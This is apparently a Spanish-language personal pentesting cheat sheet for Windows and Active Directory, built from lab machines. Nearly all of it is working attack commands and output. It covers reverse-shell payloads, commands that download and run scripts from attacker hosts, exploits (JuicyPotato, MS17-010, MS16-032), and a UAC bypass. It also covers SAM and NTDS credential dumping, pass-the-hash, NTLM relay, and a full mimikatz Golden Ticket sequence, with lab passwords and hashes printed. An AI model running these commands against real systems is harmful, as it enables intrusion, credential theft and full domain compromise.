# Windows

***\- Identificar permisos del usuario***
whoami /priv
whoami /all
·· Juicypotatoes ··
se carga el reverse shell .bat
msfvenom -p cmd/windows/reverse\_powershell lhost=192.168.119.230 lport=4444 > rs.bat
se descarga y se carga el exploit en la maquina
JPo.exe -t \* -p rs.bat -l 3334 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
anyes de ejecutar se tiene que abrir un sudo rlwrap nc -lnvp 4444

##### 

***\- Enumerando version OS***
systeminfo \| findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card\(s\)" /C:"Hotfix\(s\)"
**\- Enumerando procesos en ejecucion**
tasklist /SVC
**\- Info de usuario**
net user USUARIO
net localgroup administrators
**\- ver conexiones activas**
netstat -ano
**\- enumerando reglas de FW**
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
**\- enumerando jobs**
schtasks /query /fo LIST /v
**\- Enumerando credenciales almacenadas**
cmdkey /list
runas /savecred /user:admin C:\\PrivEsc\\reverse.exe
**enumerando aplicaciones instaladas**
wmic product get name, version, vendor or wmic qfe get Caption, Description, HotFixID, InstalledOn
**\- bypass UAC**
sigcheck.exe -a -m C:\\Windows\\System32\\fodhelper.exe
--Verificar que ---
**<requestedExecutionLevel**
**level="requireAdministrator"**
**/>**
\<autoElevate><strong>true</strong>\</autoElevate>

\*<em>\- Ver que servicios se pueden subir manualmente</em>
cmd\.exe /c sc queryex state=all type=serviceGet\-Service \| findstr \-i "manual"gwmi \-class Win32\_Service \-Property Name\, DisplayName\, PathName\, StartMode \| Where \{$\_\.PathName \-notlike "C:\\Windows" \-and $<em>\.PathName \-notlike '"\*'\} \| select PathName\,DisplayName\,Namegwmi \-class Win32\_Service \-Property Name\, DisplayName\, PathName\, StartMode \| Where \{$</em>\.StartMode \-eq "manual"\} \| select PathName\,DisplayName\,Name
reg query HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\services\\seclogon
confirma si el servicio de seclogon es manual "cmd.exe /c sc qc seclogon"
cmd.exe /c sc sdshow seclogon RP=start service / AU = ALL users

REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG\_SZ
REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f
whoami /groups <- verificar que se tenga **"MAndatory Label High Mandatory Level"**
si todo bien, se puede crear un usuario
net user admin Ev!lpass
**\- Identificacion de carpetas sobrescribibles o verificacion de permisos**
accesschk.exe -ucqv [service\_name] /accepteula
accesschk.exe -uws "Everyone" "C:\\Program Files"
Get\-ChildItem "C:\\Program Files" \-Recurse \| Get\-ACL \| ?\{$\_\.AccessToString \-match "Everyone\\sAllow\\s\\sModify"\}
**\- Identificacion de binarios sobrescribibles**
reg query HKEY\_CURRENT\_USER\\Software\\Policies\\Microsoft\\Windows\\Installer
**\- Enumerando volumenes**
mountvol
**\- Enumeracion de Drivers y modulos**
powershell
driverquery\.exe /v /fo csv \| ConvertFrom\-CSV \| Select\-Object ‘Display Name’\, ‘Start Mode’\, Path
Get\-WmiObject Win32\_PnPSignedDriver \| Select\-Object DeviceName\, DriverVersion\, Manufacturer \| Where\-Object \{$\_\.DeviceName \-like "\*VMware\*"\}
\- Informacion adicional
cmd.exe /c dir /a C:\\
\- Visualizacion de permisos
icalcs “C:\\Program Files\\nasm-2.24\\win64\\nssm.exe”
icalcs “C:\\Program Files\\nasm-2.24\\win64"

* 

**\- Impacket \- ms17\-010**
nmap -d -sC -p445 --script smb-vuln-ms17-010.nse 10.10.72.70
se debe hacer ambiente virtual
git clone https://github.com/SecureAuthCorp/impacket.git
cd ms17-010-exploit
apt install python2-pip-whl
apt install python2-pip-whl
apt install python2-setuptools-whl\\n
virtualenv -p python2 venv
source venv/bin/activate
pip install impacket
pip install pycrypto
msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.119.192 LPORT=4445 -f exe > shell.exe
python send\_and\_execute.py 10.11.1.5 shell.exe 445 browser
nc -nlvp 4445
**\- apt install bloodhound neo4j**
**\- identificacion de usuarios**
./kerbrute\_linux\_amd64 userenum -d spookysec.local userlist.txt
kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip 192.168.194.165
**permite identificar hash de un usuario privilegiado mediante consulta de GNP sin password**
python3.10 /opt/impacket/examples/GetNPUsers.py "spookysec.local/svc-admin"
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a3b87eeaa23c250478bf82bdb0dbab70$7207c49081906c59084f6d56c2767c7d357ee0a3f9e4630a5cef809bf7c290e15ff115d0f73c246d93c9d2d76a22bbefb0b89781c9d1c79a17572ad4f22e1ec9fb4ba5cb974762ecae06dd91c78af3138661942c508b16144d6ecca037a44b93e678d0b24879785913c7c54c8dafd8df4c9349c059e05293d00ce2de23cfe79c370bf7d420df09d3aa4f818a919be91b51da14646f991fd31c23396e3e1cf7625cc7b30811d2a659526af68f08b618a3f667484a3b939eff8111db3d496d7fd951d1e0285f50c7ff5d7309ccbb543a1d4ba506c1efef58b96ff4877a95796d0344570432c744cc53cdb440b7024a37211637

hashcat -m 18200 hash passwordlist.txt
password: management2005

<br>
**\- Identificacion de recursos compartidos**
smbclient -L //SPOOKYSEC.LOCAL -U svc-admin
**\- Conectar a un recurso compartido**
smbclient //SPOOKYSEC.LOCAL/backup -U svc-admin
password identificado en txr : backup@spookysec.local:backup2517860
**\- Volcado de usuarios**
secretsdump.py pookysec.local/backup:backup2517860@10.10.15.51
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc\_s\_access\_denied
[\*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[\*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::

**\- Conexion por evil\-winrm**
evil-winrm -i 10.10.15.51 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
\*Evil-WinRM\* PS C:\\Users\\Administrator\\Documents> dir
**\- Conexion reversa**
/usr/share/windows-binaries/nc.exe
certutil.exe -urlcache -split -f "http://192.168.119.168/nc.exe" accesschk64.exe <- descargar archivos desde windows cmd
nc -nlvp 8888
nc.exe ip puerto -e cmd.exe

**\- Buscar vulnerabilidades**
powershell "iex(new-object net.webclient).downloadString('http://192.168.119.168/sherlock.ps1');Find-AllVulns"
"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser

**\- MS16\-032**
certutil.exe -urlcache -split -f "http://192.168.119.168/accesschk64.exe" accesschk64.exe
"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" Import-module -Name "C:\\Users\\Bethany\\AppData\\Local\\Temp\\MS16-032.ps1" "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" "C:\\Users\\Bethany\\AppData\\Local\\Temp\\MS16-032.ps1"
"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" IEX(New-Object Net.Webclient).downloadString('http://192.168.119.168/MS16-032.ps1')

**\- MS16\-0135**
certutil.exe -urlcache -split -f "http://192.168.119.168/accesschk64.exe" accesschk64.exe
"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" Import-module -Name "C:\\Users\\Bethany\\AppData\\Local\\Temp\\MS16-135.ps1"
"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe" "C:\\Users\\Bethany\\AppData\\Local\\Temp\\MS16-135.ps1"

<br>
**\- Psexec**
impacket-psexec "svcorp/pete:ThisIsTheUsersPassword19"@10.11.1.21
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb "./Administrator"@10.11.1.2

**\- SQL**
mssqlclient.py -port 1435 sa:EjectFrailtyThorn425@192.168.67.70
impacket-mssqlclient -p 1433 1NSIDER/sa:sqls3rv3r@10.11.1.111
con acceso como adminnistrador permite ejecutar comandos en el sistema, el cual se logra tener revershell
SQL> enable\_xp\_cmdshell;
SQL> xp\_cmdshell whoami

<br>
**\- Dump password windows Cache** \- NOTA: Estos archivos se deben generar con usuario System
reg save HKLM\\sam sam
reg save HKLM\\system system
reg save HKLM\\security security
\- pasar a impacket los archivos generados
impacket-secretsdump -sam sam -security security -system system LOCAL
[\*] Dumping cached domain logon information (domain/username:hash)
Domain/Nathan:$DCC2$10240#Nathan#298e6604af6e3f8a9fac422ab8feaf26
-guardar lo anterior en archivo key y crackear password
john --wordlist=rockyou.txt key

**\- extraer informacion de usuarios principales SPNs**
impacket-GetUserSPNs -dc-ip 192.168.183.57 'OFFSEC.LOCAL/usuario:password' -outputfile UserSPNs
john --format=krb5tgs --wordlist=rockyou.txt UserSPNs
john --format=krb5tgs --show UserSPNs

<br>
<br>
**\- Bloodhound**
/opt/Windows/BloodHound\_Python/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.194.165
sudo neo4j console
sudo bloodhound

<br>
<br>
<br>
ver privilegios
getprivs

ver procesos
ps

fcastle = administrador en el equipode pparker
pparker = usuario sin permisos (iptarget)

reponder.py -I eth0 -rdw <--- envenenador de trafico
crakcear por ferza bruta
john --worldist=rockou.txt hashes

Identificar equipos en la red y se identifica si tiene SMB firmado o no
crackmapexec smb ip/24 o solo la ip

Identificar usuarios administradores en los equipos (Pwn3d!) Password sparaying
crackmapexec smb ip/24 -u 'usuarioconprivilegios' -p'password1' ##los que salgan con (pwn3d! siginifica que tenemos acceso)
crackmapexec smb ip/24 -u 'usuarioconprivilegios' -p'password1' -M rdp -o action=enable ##habilitar RDP en los equipos
crackmapexec smb ip-del-DC -u 'usuarioconprivilegios' -p'password1' --ntds -vss ##dump los hashes, se puede hacer pass the hash "pth"

pass the hash (PTH)
impacket-wmiexec marvel.local/fcastle@192.168.50.103 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b

NTLMrelay
modificar archivp
vim /etc/responder/Responder.conf <--- cambia http - SB -> off
definir archivo target : el cual donde se desea ingresar y tiene permisos de administrador (pwn3d!)

IPV4
impacket-ntlmrelayx -tf targets -smb2support <- se hace un dummp de SAM.

tambien se pueden ejecutar comandos cuando se envenee la comunicacion
descargar git clone https://github.com/samratashok/nishang.git
modificar el Invoke-PowerShellTCP.ps1 (cp Invoke-PowerShellTCP.ps1 PS.ps1)
editar PS.ps1 y al final de linea poner (Invooke-PowerShellTCP -Reverse -UPAddress ip-atacante -Port 4444)
python -m http.server 8000
reponder.py -I eth0 -rdw
impacket-ntlmrelayx -tf targets -smb2support -c "powershell IEX(New-Object New.WebClient).downloadString('http://192.168.50.105:8000/PS.ps1')"
nc -lnvp 4444
####Ya se deberia tener revershell en la maquina definida en el archivo target

IPV6
pip install mitm6
mitm6 -d marvel.local
ntlmrelayx.py -6 -wh ipatacante -t smb://ip-target -socks -debug -smb2support <crear una sesion interactiva
ejecutar "socks" \<debera decir AdminStatus = True <>
vim /etc/proxychains4.conf <<poner 1008 como puerto de proxy
proxychains crackmapexec smb iptarget -u 'fcastle' -p 'asd' -d 'marvel' --sam \<se puede poner cualquier contraseña, por que se aprovecha el relay de comunicacion y credenciales>

conexion al target con credenciales validas
impacket-psexec marvel.local/administrator:Camidu10.@192.168.50.103 cmd.exe
evil-winrm -u 'SQLService' -p 'Mypassword123.' -l 192.168.50.103

Enumeracion de AD (null session, de lo contrario hacer autenticacion con un usuario valido)
rpcclient -U 'hydra.local\\pparker%password1' 192.168.50.103 -c enumdousers ó queryuser

Kerberos y asproast

identificar usuario con SPN (service princiapl name)
GETUsersSPNs.py hydra.local/pparker:Password1 -request
crack con john \<validar si el usuario identiicado con la contraseña es adinistrador, se valida con cme smb ip -u usuario -p password (pwn3d!)>

fuerza bruta e identificacion de usuarios con SPN
GetNPUsers.py domain/ -no.pass -usersfile user.txt

Privilege escalation
apt-get install neo4j bloodhound
conectar en maquina vulnerada y descargar mimikatz /usuario administrado

**\- Golden Ticket**
https://www.netwrix.com/how\_golden\_ticket\_attack\_works.html
whoami /user >> sacar SID

* [x] \-\-\-\> lsadump::lsa /inject /user:Krbtgt

[DC] 'svcorp.com' will be the domain
[DC] 'sv-dc01.svcorp.com' will be the DC server
[DC] 'svcorp\\Krbtgt' will be the user account
[rpc] Service : ldap
[rpc] AuthnSvc : GSS\_NEGOTIATE (9)
Object RDN : krbtgt

\*\* SAM ACCOUNT \*\*
SAM Username : krbtgt
Account Type : 30000000 ( USER\_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL\_ACCOUNT )
Account expiration :
Password last change : 3/7/2019 6:44:56 AM
Object Security ID : S-1-5-21-466546139-763938477-1796994327-502
Object Relative ID : 502

Credentials:
Hash NTLM: 22ec2cc749ad47431602a8d2ba0954e9
ntlm- 0: 22ec2cc749ad47431602a8d2ba0954e9
lm - 0: d85fe44f53fc02f44d319de97c94b7dc

Supplemental Credentials:
\* Primary:NTLM-Strong-NTOWF \*
Random Value : e79d8dea260ddb159c1d133a60311622

\* Primary:Kerberos-Newer-Keys \*
Default Salt : SVCORP.COMkrbtgt
Default Iterations : 4096
Credentials
aes256\_hmac (4096) : f7778735ed1b43d3197a405d38c1dc16fb371ada22a69c5e50980cabcdb4c476
aes128\_hmac (4096) : 644ea916ebe6cbb4914bc7ad63a68d75
des\_cbc\_md5 (4096) : 103de302c29d2a57

\* Primary:Kerberos \*
Default Salt : SVCORP.COMkrbtgt
Credentials
des\_cbc\_md5 : 103de302c29d2a57

\* Packages \*
NTLM-Strong-NTOWF

<br>
\* Primary:WDigest \*
01 89ce7a4db6978de087541c2dd8660417
02 21f8e154d475abc35f49e253acd0f9ab
03 3a5fab3699c55d5b74c3b02012e07eb4
04 89ce7a4db6978de087541c2dd8660417
05 21f8e154d475abc35f49e253acd0f9ab
06 e8cd022f5a7188b221d532722d305e2d
07 89ce7a4db6978de087541c2dd8660417
08 a721dfe22752748b65d382e823fb8b60
09 a721dfe22752748b65d382e823fb8b60
10 0847ab6447ebc6c89eea131e52549398
11 a31f81a0600d354f75e7420c294bf7c1
12 a721dfe22752748b65d382e823fb8b60
13 bf91ff964394c4ae17b69a306e2acb75
14 a31f81a0600d354f75e7420c294bf7c1
15 43f7d221ba1e15b1b63cff247ed2e7d4
16 43f7d221ba1e15b1b63cff247ed2e7d4
17 fbd69ac9387ce19fa93da710338ea836
18 8d91829bae4d33b6a87af07301961a29
19 75b77e9491db146d773a258570953fe2
20 f605ae695eef6d9bd15abf0e83f3231e
21 a23d0140ede12047259d5a2351d88b6a
22 a23d0140ede12047259d5a2351d88b6a
23 a3b751d43258a5eedf8877dba4c3da72
24 b4d758ce5bb215fd465fb816418258ce
25 b4d758ce5bb215fd465fb816418258ce
26 49bea3d09401d5fe5d48636686fdd4f5
27 c68db1a0e675f8673c991722800a404e
28 864f55ef3951454fe6e3c010247d9358
29 9bd88c3fb05c84cca139d18bad8588a9

* [x] --> kerberos::golden /domain:svcorp.com /sid:S-1-5-21-466546139-763938477-1796994327-1124 /rc4:22ec2cc749ad47431602a8d2ba0954e9 /id:500 /user:Administrator /ticket:golden.kirbi

User : TrustMeImanAdmin
Domain : svcorp.com (SVCORP)
SID : S-1-5-21-466546139-763938477-1796994327-1124
User Id : 500
Groups Id : \*513 512 520 518 519
ServiceKey: 22ec2cc749ad47431602a8d2ba0954e9 - rc4\_hmac\_nt
Lifetime : 8/16/2022 7:52:55 PM ; 8/13/2032 7:52:55 PM ; 8/13/2032 7:52:55 PM
-> Ticket : ticket.kirbi

\* PAC generated
\* PAC signed
\* EncTicketPart generated
\* EncTicketPart encrypted
\* KrbCred generated

Final Ticket Saved to file !

* [x] --> mimikatz # kerberos::ptt ticket.kirbi

\* File: 'ticket.kirbi': OK

* [x] mimikatz # misc::cmd
* [x] pushd \\\domain\\c$

#####Fin Golden Ticket

decargar archivo golden.kirbi y mimikatz a otra maquina windows.
impacket-smbserver a /tmp/ -smb2support
copy golden.kirbi \\ipatacante\\a\\

hacer PTH pass the tocket dentro de la maquina windows
mediante mimikatz
kerberos::prr golden.kirbi
dir \\ip-DC\\C$

Para conectar al DC
hacer uso de los datos identificados con mimikarz
impacket-ticketer -nthash 22ec2cc749ad47431602a8d2ba0954e9 -domain-sid S-1-5-21-466546139-763938477-1796994327-502 -domain marvel.local Administrator
export KRB5CCNAME="/home/kandalf/Administrator.ccache"
impacket-psexec -n -k marvel.local/administrator@192.168.50.103 cmd.exe \<ahora se hace sin contraseña por que se esta cargando desde una variable>

NOTA : FILE SCF para capturar credenciales y subir responder

<br>
Verificar Null Session, si es suscced se puede hacer ataque de 

python3 set\_empty\_pw.py DC01 192.168.194.165
secretsdump -just-dc nombremaquin/dominio\\$@ip